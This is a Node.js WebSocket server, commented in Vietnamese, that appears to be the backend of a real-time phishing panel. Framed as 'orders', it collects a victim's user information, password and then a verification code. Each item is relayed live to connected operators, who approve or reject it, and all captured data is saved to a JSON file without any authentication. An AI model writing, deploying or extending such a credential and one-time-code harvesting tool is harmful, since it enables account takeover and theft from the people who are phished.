const WebSocket = require('ws');
const fs = require('fs');
const wss = new WebSocket.Server({ port: 8080 });

let orders = loadOrdersFromFile();
let clients = [];

function randomColorText() {
    // màu nhạt ngẫu nhiên
    const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16);
    return randomColor;
}

wss.on('connection', function connection(ws) {
  clients.push(ws);

  ws.on('message', function incoming(message) {
    const data = JSON.parse(message);

    if (data.type === 'new_order') {
      // Tạo mới đơn hàng
      const colorText = randomColorText();
      orders[data.order_id] = { 
        step: data.step, 
        user_info: data.user_info,
        colorText: colorText
      };
      saveOrdersToFile();
      broadcastToAdmins({
        type: 'new_order',
        order_id: data.order_id,
        user_info: data.user_info,
        step: data.step,
        colorText: colorText
      });
    }

    if (data.type === 'admin_approve') {
      const order = orders[data.order_id];
      if (order) {
        order.step = data.step;
        orders[data.order_id].step = data.step;
        orders[data.order_id].colorText = data.colorText;
        saveOrdersToFile();
        broadcastToAdmins({
          type: 'admin_approve',
          order_id: data.order_id,
          step: order.step,
          user_info: order.user_info
        });
      }
    }

    if (data.type === 'enter_password') {
      const order = orders[data.order_id];
      if (order) {
        order.user_info.password = data.password;   
        order.step = data.step;
        orders[data.order_id].step = data.step;
        saveOrdersToFile();

        broadcastToAdmins({
          type: 'enter_password_to_admin',
          order_id: data.order_id,
          step: order.step,
          password: data.password,
          user_info: order.user_info
        });
      }
    }

    if (data.type === 'admin_approve_password') {
      const order = orders[data.order_id];
      if (order) {
        order.step = data.step;
        order.user_info.password = data.password;
        orders[data.order_id].step = data.step;
        saveOrdersToFile();
        broadcastToAdmins({
            type: 'admin_approve_password_to_user',
            order_id: data.order_id,
            step: order.step,
            password: data.password,
            user_info: order.user_info
        });
      }
    }

    if (data.type === 'admin_reject_password') {
      const order = orders[data.order_id];
      if (order) {
        broadcastToAdmins({
          type: 'admin_reject_password_to_user',
          order_id: data.order_id,
          step: order.step,
          password: data.password,
          user_info: order.user_info
        });
      }
    }

    if (data.type === 'enter_code') {
        const order = orders[data.order_id];
        if (order) {
          order.user_info.code = data.code;   
          order.step = data.step;
          orders[data.order_id].step = data.step;
          saveOrdersToFile();
  
          broadcastToAdmins({
            type: 'enter_code_to_admin',
            order_id: data.order_id,
            step: order.step,
            code: data.code,
            user_info: order.user_info
          });
        }
      }
  
      if (data.type === 'admin_approve_code') {
        const order = orders[data.order_id];
        if (order) {
          order.step = data.step;
          order.user_info.code = data.code;
          orders[data.order_id].step = data.step;
          saveOrdersToFile();
          broadcastToAdmins({
              type: 'admin_approve_code_to_user',
              order_id: data.order_id,
              step: order.step,
              code: data.code,
              user_info: order.user_info
          });
        }
      }
  
      if (data.type === 'admin_reject_code') {
        const order = orders[data.order_id];
        if (order) {
          broadcastToAdmins({
            type: 'admin_reject_code_to_user',
            order_id: data.order_id,
            step: order.step,
            code: data.code,
            user_info: order.user_info
          });
        }
      }


    if (data.type === 'get_all_orders') {
        const allOrders = {};
      
        for (const orderId in orders) {
          const { step, user_info, colorText } = orders[orderId];
          allOrders[orderId] = { step, user_info, colorText };
        }
      
        ws.send(JSON.stringify({
          type: 'all_orders',
          orders: allOrders
        }));
    }

    if (data.type === 'remove_all_orders') {
      removeAllOrders();
      broadcastToAdmins({
        type: 'remove_all_orders',
        message: 'Tất cả đơn hàng đã được xóa'
      });
    }

    if (data.type === 'remove_order') {
      const order = orders[data.order_id];
      if (order) {
        delete orders[data.order_id];
        saveOrdersToFile();
        broadcastToAdmins({
          type: 'remove_order',
          order_id: data.order_id,
          message: 'Đơn hàng đã được xóa'
        });
      }
    }

  });

  ws.on('close', function close() {
    clients = clients.filter(client => client !== ws);
  });
});

function broadcastToAdmins(message) {
  clients.forEach(client => {
    client.send(JSON.stringify(message));
  });
}

function saveOrdersToFile() {
  fs.writeFileSync('orders.json', JSON.stringify(orders, null, 2));
}

function loadOrdersFromFile() {
  if (fs.existsSync('orders.json')) {
    const data = fs.readFileSync('orders.json');
    return JSON.parse(data);
  }
  return {};
}

function removeAllOrders() {
  orders = {};
  if (fs.existsSync('orders.json')) {
    fs.unlinkSync('orders.json');
  }
}

console.log('WebSocket server started on ws://localhost:8080');